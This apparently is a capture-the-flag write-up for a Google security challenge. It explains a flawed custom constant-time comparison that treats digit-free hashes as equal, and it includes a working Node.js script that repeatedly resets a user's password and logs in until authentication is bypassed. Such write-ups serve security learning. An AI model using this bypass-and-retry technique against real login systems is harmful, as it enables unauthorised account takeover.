@@ -1,0 +1,107 @@
+#+title: H4ck1ng G00gl3 ep004 challenge 02
+#+description: todo
+#+publishdate: 2022-11-20
+#+options: ^:nil
+
+
+* Introduction
+
+[[https://h4ck1ng.google/][H4ck1ng G00gl3]] is a series of security challenges published on *October 2022* where the only way to win is to think like a hacker. In this post, I explain how I solved *ep004 challenge 02*. Category *Web Exploitation*.
+
+* Learning Journey
+
+[[../../images/h4ck1ng00gl3ep004ch02/intro.png]]
+
+In this challenge, we are given some code. We have to find the vulnerability and login as "tin". Let's check the code.
+
+[[../../images/h4ck1ng00gl3ep004ch02/hashed-passwords.png]]
+
+I found two hardcoded users and their hashed passwords in the "users.js" file. My first idea was to try and bruteforce somehow the password for "tin", but to no avail. I also searched for the value in some rainbow tables on the internet, but it didn't work out.
+
+In that file, I also found a function to reset the password with a comment saying: "we don't allow admins to reset passwords". "tin" is not an admin, and that comment makes me think it has to be an important detail. However, I don't see how this helps me now, so I wrote it down and continued reading the code.
+
+[[../../images/h4ck1ng00gl3ep004ch02/reset-password.png]]
+
+I found another interesting file, "safe-equals.js". It's strange because *the developers programmed their own version of constant time string comparison*. Programming your own cryptographic functions is dangerous. For sure, there must be some vulnerability hidden here. At first glance, it seems to be correct. I didn't pay the required attention to the code. I read it fast and thought it was comparing each letter of the string position by position, regardless of the first position where the letters differed.
+
+[[../../images/h4ck1ng00gl3ep004ch02/safe-equal.png]]
+
+That made me lose a lot of time double-checking other parts of the code. I went to ask the community. Effectively, the *"safeEqual" function is vulnerable*. I had to come back and read it again. This time I decided to check line by line and check on the internet the documentation for every function. After that, I understood the problem. It isn't comparing each value stored in each position of the strings passed as input. Instead, *it compares the indices of the first appearance of every number that the loop is iterating*. I'm not sure I explained myself there, so let me put it in an example.
+
+#+begin_src javascript
+  // Example: call the function with two strings of the same length
+  function safeEqual('abc123', 'a1b2c3') {
+      let match = true;
+
+      // For our input, this condition is not met
+      if(a.length !== b.length) {
+          // This is not executed
+          match = false;
+      }
+
+      const l = a.length; // l = 6
+      // Iterate from 0 to 5
+      for (let i = 0; i < l; i++) {
+        // Compare the index of value "i" in both strings.
+        // For i = 0 -> a.indexOf(0) === b.indexOf(0) -> -1 === -1 -> true
+        // For i = 1 -> a.indexOf(1) === b.indexOf(1) -> 4 === 1 -> false
+        // ...
+        match &&= a.indexOf(i) === b.indexOf(i);
+      }
+
+
+    return match;
+  }
+
+  safeEqual('abc123', 'a1b2c3') // returns false
+  safeEqual('abcd', 'qwer') // returns true
+  safeEqual('ab12c', 'qw121') // returns true
+#+end_src
+
+The function checks that the first occurrence of each number in both strings returns the same index. If you think about it, that means that any two strings without numbers will return true. *The trick then is to reset "tin" password until it creates a hash without numbers. Then, we must log in with a password that produces a hash without numbers.*
+
+First, I searched for a password that produced a hash without numbers. It was simple. I just computed in a for loop the hash value for strings of different lengths with the letter "a" (e.g., "a", "aa", "aaa"). The result was that a *string containing seventy-three "a" produces a hash without numbers*. That is our password. The second step was creating a script that automatically called the reset password endpoint and then tried to log in with the password we computed.
+
+#+begin_src javascript
+  const requestPromise = require('request-promise').defaults({ jar: true });
+
+  var loginOptions = {
+      method: 'POST',
+      uri: 'https://vrp-website-web.h4ck.ctfcompetition.com/login',
+      form: {
+          username: 'tin',
+          password: 'a'.repeat(73)
+      },
+      followAllRedirects: true,
+  };
+
+  var resetOptions = {
+      method: 'POST',
+      uri: 'https://vrp-website-web.h4ck.ctfcompetition.com/reset-password',
+      form: {
+          username: 'tin'
+      },
+  };
+
+  (async function () {
+      let i = 0;
+      let incorrect = true;
+      while (incorrect) {
+          const loginResponse = await requestPromise(loginOptions);
+          incorrect = /Incorrect/.test(loginResponse);
+          console.log(i);
+          i++;
+
+          if (!incorrect) {
+              console.log(loginResponse);
+              break;
+          }
+
+          await requestPromise(resetOptions);
+      }
+  })();
+#+end_src
+
+Executing the script returns the response with the flag. With that, we completed the challenge.
+
+[[../../images/h4ck1ng00gl3ep004ch02/intro.png]]
